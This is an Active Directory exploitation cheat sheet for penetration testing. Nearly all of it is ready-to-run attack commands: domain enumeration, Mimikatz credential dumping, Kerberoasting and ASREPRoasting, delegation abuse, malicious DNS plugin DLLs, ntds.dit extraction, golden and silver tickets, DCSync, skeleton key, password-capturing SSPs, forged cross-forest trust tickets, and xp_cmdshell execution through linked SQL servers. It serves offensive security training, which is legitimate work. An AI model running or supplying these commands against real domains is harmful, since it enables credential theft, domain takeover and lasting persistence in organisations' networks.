# Active Directory Exploitation Cheat Sheet

A cheatsheet that contains common enumeration and attack methods for Windows Active Directory.

This cheatsheet is inspired by the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) repo.


![Just Walking The Dog](https://github.com/buftas/Active-Directory-Exploitation-Cheatsheet/blob/master/WalkTheDog.png)

## Summary

- [Active Directory Exploitation Cheatsheet](#active-directory-exploitation-cheatsheet)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Enumeration](#enumeration)
    - [Using PowerView](#using-powerview)
    - [Using AD Module](#using-ad-module)
  - [Local Privilege Escalation](#local-privilege-escalation)
  - [Lateral Movement](#lateral-movement)
    - [Powershell Remoting](#powershell-remoting)
  - [Domain Privilege Escalation](#domain-privilege-escalation)
  - [Domain Persistence](#domain-persistence)
  - [Cross Forest Attacks](#cross-forest-attacks)

## Tools
- [Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compiled Version](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [AD Module](https://github.com/samratashok/ADModule)
- [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)

## Enumeration

### Using PowerView
  
- **Get Current Domain:** `Get-NetDomain`
- **Enum Other Domains:** `Get-NetDomain -Domain <DomainName>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Policy:** 
  ```
  Get-DomainPolicy

  #Will show us the policy configurations of the Domain about system access or kerberos
  (Get-DomainPolicy)."system access"
  (Get-DomainPolicy)."kerberos policy"
  ```
- **Get Domain Controlers:** 
  ```
  Get-NetDomainController
  Get-NetDomainController -Domain <DomainName>
  ```
- **Enumerate Domain Users:** 
  ```
  Get-NetUser
  Get-NetUser -Username <user> 
  Get-NetUser | select cn
  Get-UserProperty

  #Check last password change
  Get-UserProperty -Properties pwdlastset

  #Get a spesific "string" on a user's attribute
  Find-UserField -SearchField Description -SearchTerm "wtver"
  ```
- **Enum Domain Computers:** 
  ```
  Get-NetComputer -FullData
  Get-DomainGroup

  #Enumerate Live machines 
  Get-NetComputer -Ping
  ```
- **Enum Group Policies:** 
  ```
  Get-NetGPO

  # Shows active Policy on specified machine
  Get-NetGPO -ComputerName <Name of the PC>
  Get-NetGPOGroup

  #Get users that are part of a Machine's local Admin group
  Find-GPOComputerAdmin -ComputerName <ComputerName>
  ```
- **Enum OUs:** 
  ```
  Get-NetOU -FullData 
  Get-NetGPO -GPOname <The GUID of the GPO>
  ```
- **Enum ACLs:** 
  ```
  # Returns the ACLs associated with the specified account
  Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
  Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

  #Search for interesting ACEs
  Invoke-ACLScanner -ResolveGUIDs

  #Check the ACLs associated with a specified path (e.g smb share)
  Get-PathAcl -Path "\\Path\Of\A\Share"
  ```
- **Enum Domain Trust:** 
  ```
  Get-NetDomainTrust
  Get-NetDomainTrust -Domain <Specific Domain>
  ```
- **Enum Forest Trust:** 
  ```
  Get-NetForestDomain
  Get-NetForestDomain Forest <ForestName>

  #Domains of Forest Enumeration
  Get-NetForestDomain
  Get-NetForestDomain Forest <ForestName>

  #Map the Trust of the Forest
  Get-NetForestTrust
  Get-NetDomainTrust -Forest <ForestName>
  ```
- **User Hunting:** 
  ```
  #Finds all machines on the current domain where the current user has local admin access
  Find-LocalAdminAccess -Verbose

  #Find local admins on all machines of the domain:
  Invoke-EnumerateLocalAdmin -Verbose

  #Find computers were a Domain Admin OR a spesified user has a session
  Invoke-UserHunter
  Invoke-UserHunter -GroupName "RDPUsers"
  Invoke-UserHunter -Stealth

  #Confirming admin access:
  Invoke-UserHunter -CheckAccess
  ```
  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him ->   
  Profit!

  [PowerView 3.0 Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Using AD Module

- **Get Current Domain:** `Get-ADDomain`
- **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Controlers:** 
  ```
  Get-ADDomainController
  Get-ADDomainController -Identity <DomainName>
  ```
- **Enumerate Domain Users:** 
  ```
  Get-ADUser -Filter * -Identity <user> -Properties *

  #Get a spesific "string" on a user's attribute
  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
  ```
- **Enum Domain Computers:** 
  ```
  Get-ADComputer -Filter * -Properties *
  Get-ADGroup -Filter * 
  ```
- **Enum Domain Trust:** 
  ```
  Get-ADTrust -Filter *
  Get-ADTrust -Identity <Specific Domain>
  ```
- **Enum Forest Trust:** 
  ```
  Get-ADForest
  Get-ADForest -Identity <ForestName>

  #Domains of Forest Enumeration
  (Get-ADForest).Domains
  ```
 - **BloodHound Data Gathering:**
   ```
   #Using exe ingestor
   .\SharpHound.exe -CollectionMethod All -LDAPUser <UserName> -LDAPPass <Password> -JSONFolder <PathToFile>
    
   #Using powershell module ingestor
   . .\SharpHound.ps1
   Invoke-BloodHound --CollectionMethod All  --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>
   ```
## Local Privilege Escalation

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1)
- [BeRoot](https://github.com/AlessandroZ/BeRoot) 
- [Privesc](https://github.com/enjoiz/Privesc)
- [Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)

## Lateral Movement

- **Powershell Remoting:**
  ```
  #Enable Powershell Remoting on current Machine (Needs Admin Access)
  Enable-PSRemoting

  #Entering or Starting a new PSSession (Needs Admin Access)
  New-PSSession = $sess = New-PSSession -ComputerName <Name>
  Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
  ```
- **Remote Code Execution with PS Credentials:**
  ```
  $SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
  $Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
  Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
  ```
- **Import a powershell module and execute its functions remotely:**
  ```
  #Execute the command and start a session
  Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess 

  #Interact with the session
  Enter-PSSession -Session $sess

  ```
- **Executing Remote Stateful commands:**
  ```
  #Create a new session
  $sess = New-PSSession -ComputerName <NameOfComputer>

  #Execute command on the session
  Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

  #Check the result of the command to confirm we have an interactive session
  Invoke-Command -Session $sess -ScriptBlock {$ps}
  ```
- **Mimikatz & Invoke-Mimikatz:**
  ```
  #Dump credentials:
  Invoke-Mimikatz -DumpCreds

  #Dump credentials in remote machines:
  Invoke-Mimikatz -DumpCreds -ComputerName <ComputerName>

  #Execute classic mimikatz commands:
  Invoke-Mimikatz -Command '"sekrlusa::<ETC ETC>"'
  
  ```
  [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
- [Powercat](https://github.com/besimorhino/powercat) is nc written in powershell, and provides tunneling, relay and portforward capabilities.
- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell)

  
## Domain Privilege Escalation

- **Kerberoast:**

  - PowerView:
  ```
  #Get User Accounts that are used as Service Accounts
  Get-NetUser -SPN
  
  #get every available SPN account and dump its hash
  Invoke-Kerberoast
  
  #Requesting the TGS for a single account:
  Request-SPNTicket
    
  #Export all tickets using Mimikatz
  Invoke-Mimikatz -Command '"kerberos::list /export"'
  ```
  - AD Module:
  ```
  #Get User Accounts that are used as Service Accounts
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  ```
  - Impacket:
  ```
  python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
  ```
- **ASREPRoast:**
  - PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
  - AD Module: `Get-ADUser -Filter {DoesNoteRequirePreAuth -eq $True} -Properties DoesNoteRequirePreAuth`


  Forcefuly Disable Kerberos Preauth on an account i have Write Permissions or more!
  Check for interesting permissions on accounts:
  **Hint:** We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!
  PowerView:
  ```
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
  Disable Kerberos Preauth:
  Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
  Check if the value changed:
  Get-DomainUser -PreauthNotRequired -Verbose
  ```

  And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.
  ```
  #Get a spesific Accounts hash:
  Get-ASREPHash -UserName <UserName> -Verbose

  #Get any ASREPRoastable Users hashes:
  Invoke-ASREPRoast -Verbose
  ```

  Using Rubeus:
  ```
  #Trying the attack for all domain users
  .\Rubeus.exe asreproast /outfile:<NameOfTheFile>
  ```

  Using Impacket:
  ```
  #Trying the attack for the specified users on the file
  python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
  ```
- **Password Spray Attack:**
  If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse on other 
  domain accounts.
  **Tools:**
  - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
  - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
  - [Spray](https://github.com/Greenwolf/Spray)
- **NetNTLMv1 to Silver Ticket Attack:**

  Here is a very nice and detailed article about this attack: [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)
- **Force Set SPN:**

  *WUT IS DIS ?:
  If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a target account, then   grab its hash and kerberoast  
  it.*
  - PowerView:
  ```
  #Check for interesting permissions on accounts:
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
  
  #Check if current user has already an SPN setted:
  Get-DomainUser -Identity <UserName> | select serviceprincipalname
  
  #Force set the SPN on the account:
  Set-DomainObject -Identiny <UserName> -Set @{serviceprincipalname='ops/whatever1'}
  ```
  - AD Module:
  ```
  #Check if current user has already an SPN setted
  Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName
  
  #Force set the SPN on the account:
  Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
  ```
  Finally use any tool from before to grab the hash and kerberoast it!
- **Abuse Shadow Copies:**
  If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.
  ```
  #List shadow copies using vssadmin (Needs Admnistrator Access)
  vssadmin list shadows
  
  #List shadow copies using diskshadow
  diskshadow list shadows all
  
  #Make a symlink to the shadow copy and access it
  mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
  ```
  1) You can dump the backuped SAM database and harvest credentials.
  2) Look for DPAPI stored creds and decrypt them.
  3) Access backuped sensitive files.
- **List and Decrypt Stored Credentials:**
   [DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
- **Unconstrained Delegation**

  *WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a high value      target or DA to connect to it, steal his TGT then ptt and impersonate him!*

  Using PowerView:
  ```
  #Discover domain joined computers that have Unconstrained Delegation enabled
  Get-NetComputer -UnConstrained

  #List tickets and check if a DA or some High Value target has stored its TGT
  Invoke-Mimikatz -Command '"sekurlsa::tickets"'

  #Command to monitor any incoming sessions on our compromised server
  Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay   
  <WaitInterval> -Verbose

  #Dump the tickets to disk:
  Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

  #Impersonate the user using ptt attack:
  Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
  ```
  **Note:** We can also use Rubeus!

- **Constrained Delegation:**

  Using PowerView and Kekeo:
  ```
  #Enumerate Users and Computers with constrained delegation
  Get-DomainUser -TrustedToAuth
  Get-DomainComputer -TrustedToAuth

  #If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
  tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>

  #Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
  tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN FQDN>

  #Finally use mimikatz to ptt the TGS
  Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
  ```
  *ALTERNATIVE:*
  Using Rubeus:
  ```
  Rubeus.exe s4u /user:<UserName> /rc4:<UserToImpersonate>@<Domain's FQDN> /impersonateuser:<UserToImpersonate>@<Domain's FQDN>   
  /msdsspn:"<Service's SPN FQDN>" /altservice:<Optional> /ptt
  ```
  Now we can access the service as the impersonated user!

  :triangular_flag_on_post: **If we have a machine account with Constrained Delegation:**
  We can do the same steps as before, but insted of a user account we can use the machine's account!
  A nice misconfiguration is that even if we have only specified service that the machine account is allowed to delegate to, we can    
  delegate to any service that "uses" this machine account!

  For example if the machine account is trusted to telegate to the DC for the "time" service, we are able to use any service we want ->   ldap, cifs etc!

  That is super important and abusive, since if i can use ldap on DC i can DCsync impersonating the Domain Admnistrator!

- **Abusing Resource Based Constrained Delegation:**
    Articles that describe the attack perfectly: \
    - [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory    
      (https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
    - [RESOURCE-BASED CONSTRAINED DELEGATION ABUSE](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)
- **DNSAdmins Abuse:**

  *WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL   
  with the privileges of dns.exe that runs as SYSTEM. In case the DC servers a DNS, the user can   
  escalate his privileges to DA. This exploitation process needs privileges to restart the DNS 
  service to work.*
  
  1) Enumerate the members of the DNSAdmins group:
     - PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
     - AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
  2) Once we found a member of this group we need to compromise it (There are many ways).
  3) Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our 
     privileges:
     ```
     #Using dnscmd:
     dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
  
     #Restart the DNS Service:
     sc \\DNSServer stop dns
     sc \\DNSServer start dns
     ```
- **Abusing Active Directory-Integraded DNS:**
    - [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
    - [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)
    - [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
- **Abuse Backup Operators Group:**

  *WUT IS DIS ?: If we manage to compromise a user account that is a member of the Backup Operators 
  group, we can abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC, 
  extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.*
  
  1) Once we have access on an account that has the SeBackupPrivilege we can access the DC and create   a shadow copy using the signed   
  binary diskshadow:
    ```
    #Create a .txt file that will contain the shadow copy process script
    Script ->{
    set metadata c:\<PathToSave>metadata.cab
    set context clientaccessible
    set context persistent
    begin backup
    add volume c: alias mydrive
    create
    expose %mydrive% w:
    }
    ```
  2) Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just 
  simply copy-paste it, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are 
  going to use [this] (https://github.com/giuliano108/SeBackupPrivilege) amazing repo:
    ```
    #Importing both the dll's from the repo using powershell
    Import-Module .\SeBackupPrivilegeCmdLets.dll
    Import-Module .\SeBackupPrivilegeUtils.dll
  
    #Checking if the SeBackupPrivilege is enabled
    Get-SeBackupPrivilege
  
    #If it isn't we enable it
    Set-SeBackupPrivilege
  
    #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
    Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
  
    #Dump the SYSTEM hive
    reg save HKLM\SYSTEM c:\temp\system.hive 
    ```
  3) Using smbclient.py from impacket or some other tool and copy ntds.dit and the SYSTEM hive on our local machine.
  4) Use secretsdump.py from impacket and dump the hashes.
  5) Use psexec or another tool of your choice to PTH and get Domain Admin access.

## Domain Persistence

- **Golden Ticket Attack:**
  ```
  #Execute mimikatz on DC as DA to grab krbtgt hash:
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

  #On any machine:
  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
  ```
- **DCsync Attack:**
  ```
  #DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
  Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'
  
  #DCsync using secretsdump.py from impacket with NTLM authentication
  secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm
  
  #DCsync using secretsdump.py from impacket with Kerberos Authentication
  secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
  ```
  **Tip:** \
  /ptt -> inject ticket on current running session \
  /ticket -> save the ticket on the system for later use
- **Silver Ticket Attack:**
  ```
  Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:<ServiceType>   
  /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
  ```

  [SPN List](https://adsecurity.org/?page_id=183)
- **Skeleton Key Attack:**
  ```
  #Exploitation Command runned as DA:
  Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>

  #Access using the password "mimikatz"
  Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
  ```
- **DSRM Abuse:**

  *WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can 
  get this and then pth its NTLM hash to get local Administrator access to DC!*
  ```
  #Dump DSRM password (needs DA privs):
  Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>

  #This is a local account, so we can PTH and authenticate!
  #BUT we need to alter the behaviour of the DSRM account before pth:
  #Connect on DC:
  Enter-PSSession -ComputerName <DC's Name>

  #Alter the Logon behaviour on registry:
  New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

  #If the property already exists:
  Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
  ```
  Then just PTH to get local admin access on DC!
- **Custom SSP:**

  *WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture   
  plaintext passwords from users that logged on!*

  From powershell:
  ```
  #Get current Security Package:
  $packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty   'Security Packages'

  #Append mimilib:
  $packages += "mimilib"

  #Change the new packages name
  Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
  Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages

  #ALTERNATIVE:
  Invoke-Mimikatz -Command '"misc::memssp"'
  ```
  Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log
  
## Cross Forest Attacks

- **Trust Tickets:**
  *WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship   with an other forest we can get 
  the Trust key and forge our own inter-realm TGT.*
  
  :warning: The access we will have will be limited to what our DA account is configured to have on 
  the other Forest!
  
  Using Mimikatz:
  ```
  #Dump the trust key
  Invoke-Mimikatz -Command '"lsadump::trust /patch"'
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  #Forge an inter-realm TGT using the Golden Ticket attack
  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:  
  <OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
  <PathToSaveTheGoldenTicket>"'
  ```
  :exclamation: Tickets -> .kirbi format
  
  Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the 
  resource!
  Using Rubeus:
  ```
  .\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's FQDN" /ptt
  ```

- **MSSQL Servers**

  - Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
  - Check Accessibility as current user: 
      ```
      Get-SQLConnectionTestThreaded
      Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
      ```
   - Gather Information about the instance: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
   - Abusing SQL Database Links: \
     *WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL    
     Server. If we have two linked SQL Servers we can execute stored procedures in them. Database 
     links also works across Forest Trust!*
     
     Check for existing Database Links:
     ```
     #Check for existing Database Links:
     #PowerUpSQL:
     Get-SQLServerLink -Instace <SPN> -Verbose
     
     #MSSQL Query:
     select * from master..sysservers
     ```
     Then we can use queries to enumerate other links from the linked Database:
     ```
     #Manualy:
     select * from openquery("LinkedDatabase", 'select * from master..sysservers')
     
     #PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
     Get-SQLServerLinkCrawl -Instance <SPN> -Verbose
     
     #Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
     #Or if it is disabled enable it:
     EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
     ```
     
     Query execution: 
     ```
     Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
     ```
